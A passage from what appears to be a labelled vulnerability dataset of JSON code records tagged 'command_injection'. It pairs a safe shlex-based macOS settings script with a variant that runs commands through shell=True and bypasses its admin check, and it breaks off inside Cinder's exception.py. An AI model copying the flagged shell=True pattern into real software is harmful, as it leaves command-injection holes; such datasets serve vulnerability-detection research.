a.dest, None)\n                for a in group._group_actions\n            }\n            namespace = argparse.Namespace(**group_dict)\n            count = 0\n            for key in namespace.__dict__:\n                if key in values:\n                    if count == 0:\n                        print('[ ' + group.title + ': ] ')\n                    count += 1\n                    print('[  ' + key + ': ' + values[key] + ' ]')\n\n    def set_params(self, **kwargs):\n        \"\"\"Set overridable kwargs.\"\"\"\n        self.set_defaults(**kwargs)\n        for k, v in kwargs.items():\n            self.overridable[k] = v\n/n/n/n", "label": 1, "vtype": "command_injection"}, {"id": "bb2ded2dbbbac8966a77cc8aa227011a8b8772c0", "code": "os-x-config/standard_tweaks/install_mac_tweaks.py/n/n#! /usr/bin/env python3\n\"\"\"\nSet user settings to optimize performance, Finder and windowing features, and automate standard preference\nsettings.\n\nWhile this is an Apple specific script, it doesn't check to see if it's executing on a Mac.\n\"\"\"\n\nimport dglogger\nimport argparse\nimport os\nimport getpass\nimport grp\nimport platform\nimport re\nimport pexpect\nimport shlex\nimport subprocess\nimport sys\n\n\ndef is_admin():\n    \"\"\"Check to see if the user belongs to the 'admin' group.\n\n    :return: boolean\n    \"\"\"\n    return os.getlogin() in grp.getgrnam('admin').gr_mem\n\n\ndef is_executable(tweak_group, groups, is_admin = is_admin()):\n    \"\"\"Determines if the tweak should be executed.\n\n    :param tweak_group: tweak's group key value.\n    :param groups: groups specified on the command line.\n    :param is_admin: True if user belongs to 'admn' group.\n    :rtype: boolean\n    \"\"\"\n    # return True # for testing\n    if groups is None and tweak_group != 'sudo':\n        return True\n    if groups is None and tweak_group == 'sudo' and is_admin:\n        return True\n    if groups is not None and tweak_group in groups and tweak_group != 'sudo':\n        return True\n    if groups is not None and tweak_group in groups and tweak_group == 'sudo' and is_admin:\n        return True\n    return False\n\n\ndef os_supported(min_v, max_v):\n    \"\"\"Checks to see if the preference is supported on your version of the Mac OS.\n    NB: 10.9 is represented in the tweaks.py file as 10.09.\n\n    :param min_v:\n    :param max_v:\n    :return: boolean\n    \"\"\"\n    os_version = re.match('[0-9]+\\.[0-9]+', platform.mac_ver()[0]).group(0)  # major.minor\n    return not (os_version < str(min_v) or (max_v is not None and os_version > str(max_v)))\n\n\ndef run_batch_mode(tweaks, args):\n    for t in tweaks:\n        if os_supported(t['os_v_min'], t['os_v_max']) \\\n                and is_executable(t['group'], args.groups, is_admin()) \\\n                and t['group'] != 'test':\n            run_command(t['set'])\n\n\ndef run_command(cmd):\n    try:\n        subprocess.run(shlex.split(cmd), shell=False, timeout=60, check=True)\n        dglogger.log_info(str(cmd))\n    except subprocess.CalledProcessError as e:\n#        dglogger.log_error(e, file=sys.stderr)\n        dglogger.log_error(str(e)) # figure out deal w/file=sys.stderr!\n    except subprocess.TimeoutExpired as e:\n        dglogger.log_error(e, file=sys.stderr)\n    except OSError as e:\n        dglogger.log_error(e, file=sys.stderr)\n    except KeyError as e:\n        dglogger.log_error(e, file=sys.stderr)\n    except TypeError as e:\n        dglogger.log_error(e)\n\ndef run_interactive_mode():\n    print(\"Interactive not implemented\")\n\n\ndef run_list_mode(indent = '    '):\n    \"\"\"helper function to print summary info from the tweaks list.\n\n    :global arg.list: replies on global results from parser.\n    :param indent: number of spaces to indent. Defaults to 4.\n    :return:\n    \"\"\"\n    print(\"--list: \" + str(args.list))\n\n    if args.list == 'a' or args.list == 'all' or args.list == 'g' or args.list == 'groups':\n        grp = set()\n        for s in tweaks.tweaks:\n            grp.add(s['group'])\n\n        print('The groups are:')\n        for t in sorted(grp):\n            print(indent + t)\n\n    if args.list == 'a' or args.list == 'all' or args.list == 'd' or args.list == 'descriptions':\n        descriptions = set()\n        for d in tweaks.tweaks:\n            descriptions.add(d['group'] + ' | ' + d['description'])\n\n        print('group | description:')\n        for t in sorted(descriptions):\n            print(indent + t)\n\n\ndef main():\n    log_file = dglogger.log_config()\n\n    dglogger.log_start()\n\n    parser = argparse.ArgumentParser(\n        description=\"\"\"install_mac_tweaks changes user and global settings to improve performance, security, \n    and convenience. Results logged to a file.\"\"\"\n    )\n    group = parser.add_mutually_exclusive_group()\n    group.add_argument(\"--mode\", choices=['b', 'batch', 'i', 'interactive'],\n                   action = 'store', default = 'batch',\n                   help='Run interactively to confirm each change.')\n    group.add_argument('--list', choices = ['all', 'a', 'groups', 'g', 'descriptions', 'd'],\n                   action = 'store',\n                   help='Print lists of the groups and set commands. Silently ignores --groups.')\n    parser.add_argument('--groups', type = str, nargs='+',\n                    help='Select a subset of tweaks to execute')\n    args = parser.parse_args()\n\n    try:\n        import tweaks\n    except ImportError as e:\n        dglogger.log_error(e, file=sys.stderr)\n        dglogger.log_end(log_file)\n        sys.exit(1)\n\n    if args.list is not None:\n        run_list_mode()\n        sys.exit(0)\n    elif args.mode == 'batch' or args.mode == 'b':\n        run_batch_mode(tweaks.tweaks, args)\n    elif args.mode == 'interactive' or args.mode == 'i':\n        run_interactive_mode()\n\n    dglogger.log_end(log_file)\n\n\nif __name__ == '__main__':\n    main()\nelse:\n    print(\"WARNING: Was not expecting to be imported. Exiting.\")\n\n# regex to replace i and b for mode - code or argsparse fiddling - probably can do in argparse\n# pswd = getpass.getpass()\n# getpass.getuser() for user name - check this code, installer.py & dot-profile, rpr-3-sort-a-diofile.site, home-profile\n# # Sorting dictionaries: https://stackoverflow.com/questions/20944483/pythonct-by-its-values/20948781?utm_medium=organic&utm_source=google_rich_qa&utm_campaign=google_rich_qa\n# Sorting dictionaries: https://www.pythoncentral.io/how-to-sort-python-dictionaries-by-key-or-value/\n# Asking for a password: https://askubuntu.com/questions/155791/how-do-i-sudo-a-command-in-a-script-without-being-asked-for-a-password\n# --list output to less or more for pagination\n/n/n/nos-x-config/standard_tweaks/tweaks.py/n/n#! /usr/bin/env python3\n#  -*- coding: utf-8 -*-\n\n# Definition of OS X/MacOS tweaks\n# group, description, set, get, os_v_min, os_ver_max\n\ntweaks = [\n    {'group': 'test',\n     'description': 'Test exception handling',\n     'get': \"foobar\",\n     'set': \"set-foobar\",\n     'os_v_min': '10.09', 'os_v_max': None\n     },\n    {'group': 'animation',\n     'description': 'Disable animations when opening and closing windows.',\n     'get': \"defaults read NSGlobalDomain NSAutomaticWindowAnimationsEnabled\",\n     'set': \"defaults write NSGlobalDomain NSAutomaticWindowAnimationsEnabled -bool false\",\n     'os_v_min': '10.09', 'os_v_max': None\n     },\n    {'group': 'animation',\n     'description': 'Disable animations when opening a Quick Look window.',\n     'set': \"defaults write -g QLPanelAnimationDuration -float 0\",\n     'os_v_min': '10.09', 'os_v_max': None\n     },\n    {'group': 'animation',\n     'description': 'Disable animation when opening the Info window in OS X Finder (cmd\u2318 + i).',\n     'set': 'defaults write com.apple.finder DisableAllAnimations -bool true',\n     'os_v_min': '10.09', 'os_v_max': None\n     },\n    {'group': 'animation',\n     'description': 'Accelerated playback when adjusting the window size (Cocoa applications).',\n     'set': 'defaults write NSGlobalDomain NSWindowResizeTime -float 0.001',\n     'os_v_min': '10.09', 'os_v_max': None\n     },\n    {'group': 'animation',\n     'description': 'Disable animations when you open an application from the Dock.',\n     'set': 'defaults write com.apple.dock launchanim -bool false',\n     'os_v_min': '10.09', 'os_v_max': None\n     },\n    {'group': 'app',\n     'description': 'Always show the full URL in the search/url field',\n     'get': 'defaults read com.apple.Safari ShowFullURLInSmartSearchField',\n     'set': 'defaults write com.apple.Safari ShowFullURLInSmartSearchField -bool true',\n     'os_v_min': '10.09', 'os_v_max': None\n     },\n    {'group': 'admin',\n     'description': 'Show Recovery partition & EFI Boot partition',\n     'set': 'defaults write com.apple.DiskUtility DUDebugMenuEnabled -bool true',\n     'os_v_min': '10.09', 'os_v_max': '10.10'\n     },\n    {'group': 'general',\n     'description': 'Disable shadow in screenshots',\n     'set': 'defaults write com.apple.screencapture disable-shadow -bool true',\n     'os_v_min': '10.09', 'os_v_max': None\n     },\n    {'group': 'sudo',\n     'description': 'Disable Bonjour multicast advertisements.\\n  See https://www.trustwave.com/Resources/SpiderLabs-Blog/mDNS---Telling-the-world-about-you-(and-your-device)/',\n     'get': 'defaults read /Library/Preferences/com.apple.mDNSResponder.plist NoMulticastAdvertisements',\n     'set': 'sudo defaults write /Library/Preferences/com.apple.mDNSResponder.plist NoMulticastAdvertisements -bool YES',\n     'os_v_min': '10.09', 'os_v_max': None\n     },\n    {'group': 'sudo',\n     'description': 'Disable WiFi hotspot screen',\n     'get': 'defaults read /Library/Preferences/SystemConfiguration/com.apple.captive.control Active',\n     'set': 'sudo defaults write /Library/Preferences/SystemConfiguration/com.apple.captive.control Active -boolean false',\n     'os_v_min': '10.09', 'os_v_max': None\n     },\n    {'group': 'general',\n     'description': 'Don\u2019t show Dashboard as a Space',\n     'get': 'defaults read com.apple.dock dashboard-in-overlay',\n     'set': 'defaults write com.apple.dock dashboard-in-overlay -bool true',\n     'os_v_min': '10.09', 'os_v_max': None\n     },\n    {'group': 'Finder',\n     'description': 'Show file path in title of finder window',\n     'set': 'defaults write com.apple.finder _FXShowPosixPathInTitle -bool true',\n     'os_v_min': '10.09', 'os_v_max': None\n     },\n\n    {'group': 'general',\n     'description': 'Enable AirDrop feature for ethernet connected Macs',\n     'set': 'defaults write com.apple.NetworkBrowser BrowseAllInterfaces -bool true',\n     'os_v_min': '10.09', 'os_v_max': None\n     },\n\n    {'group': 'general',\n     'description': 'Always show scroll bars',\n     'set': 'defaults write NSGlobalDomain AppleShowScrollBars -string \"Always\"',\n     'os_v_min': '10.09', 'os_v_max': None\n     },\n\n    {'group': 'general',\n     'description': 'Expand Save panel by default (1/2)',\n     'set': 'defaults write NSGlobalDomain NSNavPanelExpandedStateForSaveMode -bool true',\n     'os_v_min': '10.09', 'os_v_max': None\n     },\n    {'group': 'general',\n     'description': 'Expand Save panel by default (2/2)',\n     'set': 'defaults write NSGlobalDomain NSNavPanelExpandedStateForSaveMode2 -bool true',\n     'os_v_min': '10.09', 'os_v_max': None\n     },\n\n    {'group': 'general', 'description': 'Expand Print menu by default (1/2)',\n     'set': 'defaults write NSGlobalDomain PMPrintingExpandedStateforPrint -bool true',\n     'os_v_min': '10.09', 'os_v_max': None\n     },\n    {'group': 'general', 'description': 'Expand Print menu by default (2/2)',\n     'set': 'defaults write NSGlobalDomain PMPrintingExpandedStateforPrint2 -bool true',\n     'os_v_min': '10.09', 'os_v_max': None\n     },\n\n    {'group': 'general',\n     'description': 'Make all animations faster that are used by Mission Control.',\n     'set': 'defaults write com.apple.dock expose-animation-duration -float 0.1',\n     'os_v_min': '10.09', 'os_v_max': None\n     },\n\n    {'group': 'Finder',\n     'description': 'Disable the delay when you hide the Dock',\n     'set': 'defaults write com.apple.Dock autohide-delay -float 0',\n     'os_v_min': '10.09', 'os_v_max': None\n     },\n\n    {'group': 'Finder',\n     'description': 'Remove the animation when hiding/showing the Dock',\n     'set': 'defaults write com.apple.dock autohide-time-modifier -float 0',\n     'os_v_min': '10.09', 'os_v_max': None\n     },\n\n    {'group': 'app',\n     'description': 'Disable the animation when you replying to an e-mail',\n     'set': 'defaults write com.apple.mail DisableReplyAnimations -bool true',\n     'os_v_min': '10.09', 'os_v_max': None\n     },\n    {'group': 'app',\n     'description': 'Disable the animation when you sending an e-mail',\n     'set': 'defaults write com.apple.mail DisableSendAnimations -bool true',\n     'os_v_min': '10.09', 'os_v_max': None\n     },\n\n    {'group': 'app',\n     'description': 'Disable the standard delay in rendering a Web page.',\n     'set': 'defaults write com.apple.Safari WebKitInitialTimedLayoutDelay 0.25',\n     'os_v_min': '10.09', 'os_v_max': None\n     },\n\n    {'group': 'general',\n     'description': 'The keyboard react faster to keystrokes (not equally useful for everyone)',\n     'set': 'defaults write NSGlobalDomain KeyRepeat -int 0',\n     'os_v_min': '10.09', 'os_v_max': None\n     },\n\n    {'group': 'general',\n     'description': 'Disable smooth scrolling for paging (space bar)',\n     'set': 'defaults write -g NSScrollAnimationEnabled -bool false',\n     'os_v_min': '10.09', 'os_v_max': None\n     },\n\n    {'group': 'Finder',\n     'description': 'Avoid creating .DS_Store files on network volumes',\n     'set': 'defaults write com.apple.desktopservices DSDontWriteNetworkStores -bool true',\n     'os_v_min': '10.09', 'os_v_max': None\n     },\n    {'group': 'Finder',\n     'description': 'Avoid creating .DS_Store files on USB volumes',\n     'set': 'defaults write com.apple.desktopservices DSDontWriteUSBStores -bool true',\n     'os_v_min': '10.09', 'os_v_max': None\n     },\n\n    {'group': 'Finder',\n     'description': 'Show the ~/Library folder',\n     'set': 'chflags nohidden ~/Library',\n     'os_v_min': '10.09', 'os_v_max': None\n     },\n\n    {'group': 'Finder',\n     'description': 'Save to disk (not to iCloud) by default',\n     'set': 'defaults write NSGlobalDomain NSDocumentSaveNewDocumentsToCloud -bool false',\n     'os_v_min': '10.09', 'os_v_max': None\n     },\n\n    {'group': 'Finder',\n     'description': 'Disable the warning when changing a file extension',\n     'set': 'defaults write com.apple.finder FXEnableExtensionChangeWarning -bool false',\n     'os_v_min': '10.09', 'os_v_max': None\n     }\n]\n/n/n/n", "label": 0, "vtype": "command_injection"}, {"id": "bb2ded2dbbbac8966a77cc8aa227011a8b8772c0", "code": "/os-x-config/standard_tweaks/install_mac_tweaks.py/n/n#! /usr/bin/env python3\n\"\"\"\nSet user settings to optimize performance, Finder and windowing features, and automate standard preference\nsettings.\n\nWhile this is an Apple specific script, it doesn't check to see if it's executing on a Mac.\n\"\"\"\n\nimport dglogger\nimport argparse\nimport os\nimport getpass\nimport grp\nimport platform\nimport re\nimport pexpect\nimport shlex\nimport subprocess\nimport sys\n\n\ndef is_admin():\n    \"\"\"Check to see if the user belongs to the 'admin' group.\n\n    :return: boolean\n    \"\"\"\n    return os.getlogin() in grp.getgrnam('admin').gr_mem\n\n\ndef is_executable(tweak_group, groups, is_admin = is_admin()):\n    \"\"\"Determines if the tweak should be executed.\n\n    :param tweak_group: tweak's group key value.\n    :param groups: groups specified on the command line.\n    :param is_admin: True if user belongs to 'admn' group.\n    :rtype: boolean\n    \"\"\"\n    return True # for testing\n    if groups is None and tweak_group != 'sudo':\n        return True\n    if groups is None and tweak_group == 'sudo' and is_admin:\n        return True\n    if groups is not None and tweak_group in groups and tweak_group != 'sudo':\n        return True\n    if groups is not None and tweak_group in groups and tweak_group == 'sudo' and is_admin:\n        return True\n    return False\n\n\ndef os_supported(min_v, max_v):\n    \"\"\"Checks to see if the preference is supported on your version of the Mac OS.\n    NB: 10.9 is represented in the tweaks.py file as 10.09.\n\n    :param min_v:\n    :param max_v:\n    :return: boolean\n    \"\"\"\n    os_version = re.match('[0-9]+\\.[0-9]+', platform.mac_ver()[0]).group(0)  # major.minor\n    return not (os_version < str(min_v) or (max_v is not None and os_version > str(max_v)))\n\n\ndef run_batch_mode(tweaks, args):\n    for t in tweaks:\n        if os_supported(t['os_v_min'], t['os_v_max']) \\\n                and is_executable(t['group'], args.groups, is_admin()) \\\n                and t['group'] != 'test':\n            run_command(t['set'])\n\n\ndef run_command(cmd):\n    try:\n        subprocess.run(cmd, shell=True, timeout=60, check=True)\n        dglogger.log_info(str(cmd))\n    except subprocess.CalledProcessError as e:\n#        dglogger.log_error(e, file=sys.stderr)\n        dglogger.log_error(str(e)) # figure out deal w/file=sys.stderr!\n    except subprocess.TimeoutExpired as e:\n        dglogger.log_error(e, file=sys.stderr)\n    except OSError as e:\n        dglogger.log_error(e, file=sys.stderr)\n    except KeyError as e:\n        dglogger.log_error(e, file=sys.stderr)\n    except TypeError as e:\n        dglogger.log_error(e)\n\ndef run_interactive_mode():\n    print(\"Interactive not implemented\")\n\n\ndef run_list_mode(indent = '    '):\n    \"\"\"helper function to print summary info from the tweaks list.\n\n    :global arg.list: replies on global results from parser.\n    :param indent: number of spaces to indent. Defaults to 4.\n    :return:\n    \"\"\"\n    print(\"--list: \" + str(args.list))\n\n    if args.list == 'a' or args.list == 'all' or args.list == 'g' or args.list == 'groups':\n        grp = set()\n        for s in tweaks.tweaks:\n            grp.add(s['group'])\n\n        print('The groups are:')\n        for t in sorted(grp):\n            print(indent + t)\n\n    if args.list == 'a' or args.list == 'all' or args.list == 'd' or args.list == 'descriptions':\n        descriptions = set()\n        for d in tweaks.tweaks:\n            descriptions.add(d['group'] + ' | ' + d['description'])\n\n        print('group | description:')\n        for t in sorted(descriptions):\n            print(indent + t)\n\n\ndef main():\n    log_file = dglogger.log_config()\n\n    dglogger.log_start()\n\n    parser = argparse.ArgumentParser(\n        description=\"\"\"install_mac_tweaks changes user and global settings to improve performance, security, \n    and convenience. Results logged to a file.\"\"\"\n    )\n    group = parser.add_mutually_exclusive_group()\n    group.add_argument(\"--mode\", choices=['b', 'batch', 'i', 'interactive'],\n                   action = 'store', default = 'batch',\n                   help='Run interactively to confirm each change.')\n    group.add_argument('--list', choices = ['all', 'a', 'groups', 'g', 'descriptions', 'd'],\n                   action = 'store',\n                   help='Print lists of the groups and set commands. Silently ignores --groups.')\n    parser.add_argument('--groups', type = str, nargs='+',\n                    help='Select a subset of tweaks to execute')\n    args = parser.parse_args()\n\n    try:\n        import tweaks\n    except ImportError as e:\n        dglogger.log_error(e, file=sys.stderr)\n        dglogger.log_end(log_file)\n        sys.exit(1)\n\n    if args.list is not None:\n        run_list_mode()\n        sys.exit(0)\n    elif args.mode == 'batch' or args.mode == 'b':\n        run_batch_mode(tweaks.tweaks, args)\n    elif args.mode == 'interactive' or args.mode == 'i':\n        run_interactive_mode()\n\n    dglogger.log_end(log_file)\n\n\nif __name__ == '__main__':\n    main()\nelse:\n    print(\"WARNING: Was not expecting to be imported. Exiting.\")\n\n# regex to replace i and b for mode - code or argsparse fiddling - probably can do in argparse\n# pswd = getpass.getpass()\n# getpass.getuser() for user name - check this code, installer.py & dot-profile, rpr-3-sort-a-diofile.site, home-profile\n# # Sorting dictionaries: https://stackoverflow.com/questions/20944483/pythonct-by-its-values/20948781?utm_medium=organic&utm_source=google_rich_qa&utm_campaign=google_rich_qa\n# Sorting dictionaries: https://www.pythoncentral.io/how-to-sort-python-dictionaries-by-key-or-value/\n# Asking for a password: https://askubuntu.com/questions/155791/how-do-i-sudo-a-command-in-a-script-without-being-asked-for-a-password\n# Add shlex parsing for safe passing of parameters\n# --list output to less or more for pagination\n/n/n/n/os-x-config/standard_tweaks/tweaks.py/n/n#! /usr/bin/env python3\n#  -*- coding: utf-8 -*-\n\n# Definition of OS X/MacOS tweaks\n# group, description, set, get, os_v_min, os_ver_max\n\ntweaks = [\n    {'group': 'test',\n     'description': 'Test exception handling',\n     'get': \"foobar\",\n     'set': \"set-foobar\",\n     'os_v_min': '10.09', 'os_v_max': None\n     },\n    {'group': 'animation',\n     'description': 'Disable animations when opening and closing windows.',\n     'get': \"defaults read NSGlobalDomain NSAutomaticWindowAnimationsEnabled\",\n     'set': \"defaults write NSGlobalDomain NSAutomaticWindowAnimationsEnabled -bool false\",\n     'os_v_min': '10.09', 'os_v_max': None\n     },\n    {'group': 'animation',\n     'description': 'Disable animations when opening a Quick Look window.',\n     'set': \"defaults write -g QLPanelAnimationDuration -float 0\",\n     'os_v_min': '10.09', 'os_v_max': None\n     },\n    {'group': 'animation',\n     'description': 'Disable animation when opening the Info window in OS X Finder (cmd\u2318 + i).',\n     'set': 'defaults write com.apple.finder DisableAllAnimations -bool true',\n     'os_v_min': '10.09', 'os_v_max': None\n     },\n    {'group': 'animation',\n     'description': 'Accelerated playback when adjusting the window size (Cocoa applications).',\n     'set': 'defaults write NSGlobalDomain NSWindowResizeTime -float 0.001',\n     'os_v_min': '10.09', 'os_v_max': None\n     },\n    {'group': 'animation',\n     'description': 'Disable animations when you open an application from the Dock.',\n     'set': 'defaults write com.apple.dock launchanim -bool false',\n     'os_v_min': '10.09', 'os_v_max': None\n     },\n    {'group': 'app',\n     'description': 'Always show the full URL in the search/url field',\n     'get': 'defaults read com.apple.Safari ShowFullURLInSmartSearchField',\n     'set': 'defaults write com.apple.Safari ShowFullURLInSmartSearchField -bool true',\n     'os_v_min': '10.09', 'os_v_max': None\n     },\n    {'group': 'admin',\n     'description': 'Show Recovery partition & EFI Boot partition',\n     'set': 'defaults write com.apple.DiskUtility DUDebugMenuEnabled -bool true',\n     'os_v_min': '10.09', 'os_v_max': '10.10'\n     },\n    {'group': 'general',\n     'description': 'Disable shadow in screenshots',\n     'set': 'defaults write com.apple.screencapture disable-shadow -bool true',\n     'os_v_min': '10.09', 'os_v_max': None\n     },\n    {'group': 'sudo',\n     'description': 'Disable Bonjour multicast advertisements.\\n  See https://www.trustwave.com/Resources/SpiderLabs-Blog/mDNS---Telling-the-world-about-you-(and-your-device)/',\n     'get': 'sudo defaults read /Library/Preferences/com.apple.mDNSResponder.plist NoMulticastAdvertisements',\n     'set': 'sudo defaults write /Library/Preferences/com.apple.mDNSResponder.plist NoMulticastAdvertisements -bool YES',\n     'os_v_min': '10.09', 'os_v_max': None\n     },\n    {'group': 'sudo',\n     'description': 'Disable WiFi hotspot screen',\n     'get': 'sudo defaults read /Library/Preferences/SystemConfiguration/com.apple.captive.control Active',\n     'set': 'sudo defaults write /Library/Preferences/SystemConfiguration/com.apple.captive.control Active -boolean false',\n     'os_v_min': '10.09', 'os_v_max': None\n     },\n    {'group': 'general',\n     'description': 'Don\u2019t show Dashboard as a Space',\n     'get': 'defaults read com.apple.dock dashboard-in-overlay',\n     'set': 'defaults write com.apple.dock dashboard-in-overlay -bool true',\n     'os_v_min': '10.09', 'os_v_max': None\n     },\n    {'group': 'Finder',\n     'description': 'Show file path in title of finder window',\n     'set': 'defaults write com.apple.finder _FXShowPosixPathInTitle -bool true',\n     'os_v_min': '10.09', 'os_v_max': None\n     },\n\n    {'group': 'general',\n     'description': 'Enable AirDrop feature for ethernet connected Macs',\n     'set': 'defaults write com.apple.NetworkBrowser BrowseAllInterfaces -bool true',\n     'os_v_min': '10.09', 'os_v_max': None\n     },\n\n    {'group': 'general',\n     'description': 'Always show scroll bars',\n     'set': 'defaults write NSGlobalDomain AppleShowScrollBars -string \"Always\"',\n     'os_v_min': '10.09', 'os_v_max': None\n     },\n\n    {'group': 'general',\n     'description': 'Expand Save panel by default (1/2)',\n     'set': 'defaults write NSGlobalDomain NSNavPanelExpandedStateForSaveMode -bool true',\n     'os_v_min': '10.09', 'os_v_max': None\n     },\n    {'group': 'general',\n     'description': 'Expand Save panel by default (2/2)',\n     'set': 'defaults write NSGlobalDomain NSNavPanelExpandedStateForSaveMode2 -bool true',\n     'os_v_min': '10.09', 'os_v_max': None\n     },\n\n    {'group': 'general', 'description': 'Expand Print menu by default (1/2)',\n     'set': 'defaults write NSGlobalDomain PMPrintingExpandedStateforPrint -bool true',\n     'os_v_min': '10.09', 'os_v_max': None\n     },\n    {'group': 'general', 'description': 'Expand Print menu by default (2/2)',\n     'set': 'defaults write NSGlobalDomain PMPrintingExpandedStateforPrint2 -bool true',\n     'os_v_min': '10.09', 'os_v_max': None\n     },\n\n    {'group': 'general',\n     'description': 'Make all animations faster that are used by Mission Control.',\n     'set': 'defaults write com.apple.dock expose-animation-duration -float 0.1',\n     'os_v_min': '10.09', 'os_v_max': None\n     },\n\n    {'group': 'Finder',\n     'description': 'Disable the delay when you hide the Dock',\n     'set': 'defaults write com.apple.Dock autohide-delay -float 0',\n     'os_v_min': '10.09', 'os_v_max': None\n     },\n\n    {'group': 'Finder',\n     'description': 'Remove the animation when hiding/showing the Dock',\n     'set': 'defaults write com.apple.dock autohide-time-modifier -float 0',\n     'os_v_min': '10.09', 'os_v_max': None\n     },\n\n    {'group': 'app',\n     'description': 'Disable the animation when you replying to an e-mail',\n     'set': 'defaults write com.apple.mail DisableReplyAnimations -bool true',\n     'os_v_min': '10.09', 'os_v_max': None\n     },\n    {'group': 'app',\n     'description': 'Disable the animation when you sending an e-mail',\n     'set': 'defaults write com.apple.mail DisableSendAnimations -bool true',\n     'os_v_min': '10.09', 'os_v_max': None\n     },\n\n    {'group': 'app',\n     'description': 'Disable the standard delay in rendering a Web page.',\n     'set': 'defaults write com.apple.Safari WebKitInitialTimedLayoutDelay 0.25',\n     'os_v_min': '10.09', 'os_v_max': None\n     },\n\n    {'group': 'general',\n     'description': 'The keyboard react faster to keystrokes (not equally useful for everyone)',\n     'set': 'defaults write NSGlobalDomain KeyRepeat -int 0',\n     'os_v_min': '10.09', 'os_v_max': None\n     },\n\n    {'group': 'general',\n     'description': 'Disable smooth scrolling for paging (space bar)',\n     'set': 'defaults write -g NSScrollAnimationEnabled -bool false',\n     'os_v_min': '10.09', 'os_v_max': None\n     },\n\n    {'group': 'Finder',\n     'description': 'Avoid creating .DS_Store files on network volumes',\n     'set': 'defaults write com.apple.desktopservices DSDontWriteNetworkStores -bool true',\n     'os_v_min': '10.09', 'os_v_max': None\n     },\n    {'group': 'Finder',\n     'description': 'Avoid creating .DS_Store files on USB volumes',\n     'set': 'defaults write com.apple.desktopservices DSDontWriteUSBStores -bool true',\n     'os_v_min': '10.09', 'os_v_max': None\n     },\n\n    {'group': 'Finder',\n     'description': 'Show the ~/Library folder',\n     'set': 'chflags nohidden ~/Library',\n     'os_v_min': '10.09', 'os_v_max': None\n     },\n\n    {'group': 'Finder',\n     'description': 'Save to disk (not to iCloud) by default',\n     'set': 'defaults write NSGlobalDomain NSDocumentSaveNewDocumentsToCloud -bool false',\n     'os_v_min': '10.09', 'os_v_max': None\n     },\n\n    {'group': 'Finder',\n     'description': 'Disable the warning when changing a file extension',\n     'set': 'defaults write com.apple.finder FXEnableExtensionChangeWarning -bool false',\n     'os_v_min': '10.09', 'os_v_max': None\n     }\n]\n/n/n/n", "label": 1, "vtype": "command_injection"}, {"id": "f752302d181583a95cf44354aea607ce9d9283f4", "code": "cinder/exception.py/n/n# vim: tabstop=4 shiftwidth=4 softtabstop=4\n\n# Copyright 2010 United States Government as represented by the\n# Administrator of the National Aeronautics and Space Administration.\n# All Rights Reserved.\n#\n#    Licensed under the Apache License, Version 2.0 (the \"License\"); you may\n#    not use this file except in compliance with the License. You may obtain\n#    a copy of the License at\n#\n#         http://www.apache.org/licenses/LICENSE-2.0\n#\n#    Unless required by applicable law or agreed to in writing, software\n#    distributed under the License is distributed on an \"AS IS\" BASIS, WITHOUT\n#    WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the\n#    License for the specific language governing permissions and limitations\n#    under the License.\n\n\"\"\"Cinder base exception handling.\n\nIncludes decorator for re-raising Cinder-type exceptions.\n\nSHOULD include dedicated exception logging.\n\n\"\"\"\n\nimport sys\n\nfrom oslo.config import cfg\nimport webob.exc\n\nfrom cinder.openstack.common import exception as com_exception\nfrom cinder.openstack.common import log as logging\n\n\nLOG = logging.getLogger(__name__)\n\nexc_log_opts = [\n    cfg.BoolOpt('fatal_exception_format_errors',\n                default=False,\n                help='make exception message format errors fatal'),\n]\n\nCONF = cfg.CONF\nCONF.register_opts(exc_log_opts)\n\n\nclass ConvertedException(webob.exc.WSGIHTTPException):\n    def __init__(self, code=0, title=\"\", explanation=\"\"):\n        self.code = code\n        self.title = title\n        self.explanation = explanation\n        super(ConvertedException, self).__init__()\n\n\nclass ProcessExecutionError(IOError):\n    def __init__(self, stdout=None, stderr=None, exit_code=None, cmd=None,\n                 description=None):\n        self.exit_code = exit_code\n        self.stderr = stderr\n        self.stdout = stdout\n        self.cmd = cmd\n        self.description = description\n\n        if description is None:\n            description = _('Unexpected error while running command.')\n        if exit_code is None:\n            exit_code = '-'\n        message = _('%(description)s\\nCommand: %(cmd)s\\n'\n                    'Exit code: %(exit_code)s\\nStdout: %(stdout)r\\n'\n                    'Stderr: %(stderr)r') % {\n                        'description': description,\n                        'cmd': cmd,\n                        'exit_code': exit_code,\n                        'stdout': stdout,\n                        'stderr': stderr,\n                    }\n        IOError.__init__(self, message)\n\n\nError = com_exception.Error\n\n\nclass CinderException(Exception):\n    \"\"\"Base Cinder Exception\n\n    To correctly use this class, inherit from it and define\n    a 'message' property. That message will get printf'd\n    with the keyword arguments provided to the constructor.\n\n    \"\"\"\n    message = _(\"An unknown exception occurred.\")\n    code = 500\n    headers = {}\n    safe = False\n\n    def __init__(self, message=None, **kwargs):\n        self.kwargs = kwargs\n\n        if 'code' not in self.kwargs:\n            try:\n                self.kwargs['code'] = self.code\n            except AttributeError:\n                pass\n\n        if not message:\n            try:\n                message = self.message % kwargs\n\n            except Exception:\n                exc_info = sys.exc_info()\n                # kwargs doesn't match a variable in the message\n                # log the issue and the kwargs\n                LOG.exception(_('Exception in string format operation'))\n                for name, value in kwargs.iteritems():\n                    LOG.error(\"%s: %s\" % (name, value))\n                if CONF.fatal_exception_format_errors:\n                    raise exc_info[0], exc_info[1], exc_info[2]\n                # at least get the core message out if something happened\n                message = self.message\n\n        super(CinderException, self).__init__(message)\n\n\nclass GlanceConnectionFailed(CinderException):\n    message = _(\"Connection to glance failed\") + \": %(reason)s\"\n\n\nclass NotAuthorized(CinderException):\n    message = _(\"Not authorized.\")\n    code = 403\n\n\nclass AdminRequired(NotAuthorized):\n    message = _(\"User does not have admin privileges\")\n\n\nclass PolicyNotAuthorized(NotAuthorized):\n    message = _(\"Policy doesn't allow %(action)s to be performed.\")\n\n\nclass ImageNotAuthorized(CinderException):\n    message = _(\"Not authorized for image %(image_id)s.\")\n\n\nclass Invalid(CinderException):\n    message = _(\"Unacceptable parameters.\")\n    code = 400\n\n\nclass InvalidSnapshot(Invalid):\n    message = _(\"Invalid snapshot\") + \": %(reason)s\"\n\n\nclass InvalidSourceVolume(Invalid):\n    message = _(\"Invalid source volume %(reason)s.\")\n\n\nclass VolumeAttached(Invalid):\n    message = _(\"Volume %(volume_id)s is still attached, detach volume first.\")\n\n\nclass SfJsonEncodeFailure(CinderException):\n    message = _(\"Failed to load data into json format\")\n\n\nclass InvalidRequest(Invalid):\n    message = _(\"The request is invalid.\")\n\n\nclass InvalidResults(Invalid):\n    message = _(\"The results are invalid.\")\n\n\nclass 